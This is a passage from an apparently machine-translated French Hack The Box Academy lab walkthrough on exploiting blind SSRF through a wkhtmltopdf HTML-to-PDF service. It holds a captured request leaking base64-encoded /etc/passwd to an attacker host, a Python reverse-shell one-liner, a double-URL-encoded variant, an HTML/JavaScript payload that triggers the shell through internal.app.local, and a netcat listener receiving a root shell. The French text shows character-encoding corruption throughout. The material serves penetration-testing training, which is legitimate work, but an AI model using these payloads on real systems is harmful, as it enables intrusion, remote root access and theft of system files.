GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1
Origin: file://
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.14.221:9090

```

![image](https://academy.hackthebox.com/storage/modules/145/img/http_server__2.png)

#### DÃ©codage Base64

Â Â DÃ©codage Base64

```
dsgsec@htb[/htb]$ echo """cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>""" | base64 -d

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```

Dans la section prÃ©cÃ©dente, nous avons exploitÃ© une application interne via SSRF et exÃ©cutÃ© des commandes Ã  distance sur le serveur cible.Â La mÃªme application interne (Â `internal.app.local`) existe dans le scÃ©nario actuel.Â Compromisons le serveur sous-jacent, mais cette fois en crÃ©ant un document HTML avec une charge utile valide pour exploiter l'application locale Ã©coutant sur internal.app.local.

Nous utiliserons la charge utile suivante du shell inversÃ© (il est assez facile d'identifier que Python est installÃ© une fois que vous avez rÃ©alisÃ© l'exÃ©cution du code Ã  distance).

#### Coque inversÃ©e Bash

CodeÂ :Â bash

```
export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

```

N'oubliez pas que nous devons coder en URL notre charge utile.Â Dans ce cas, nous devons l'encoder deux fois.Â Le rÃ©sultat final sera similaire Ã  celui ci-dessous.

#### Charge utile encodÃ©e en URL

Code :Â html

```
export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527

```

Maintenant, crÃ©ons un fichier HTML qui exÃ©cute une requÃªte GET Ã  internal.app.local, atteint l'application locale vulnÃ©rable Ã  l'exÃ©cution de code Ã  distance via SSRF et exÃ©cute notre reverse shell.

#### Charge utile HTML

Code :Â html

```
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true);
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>

```

Une fois que nous avons dÃ©marrÃ© un Ã©couteur Netcat sur notre machine et soumis le fichier HTML ci-dessus, nous recevons un shell inversÃ© provenant deÂ `internal.app.local`.

Â Â Charge utile HTML

```
dsgsec@htb[/htb]$ nc -nvlp 9090

listening on [any] 9090 ...
Connection received on 10.129.201.238 33100

# whoami

whoami
root
```
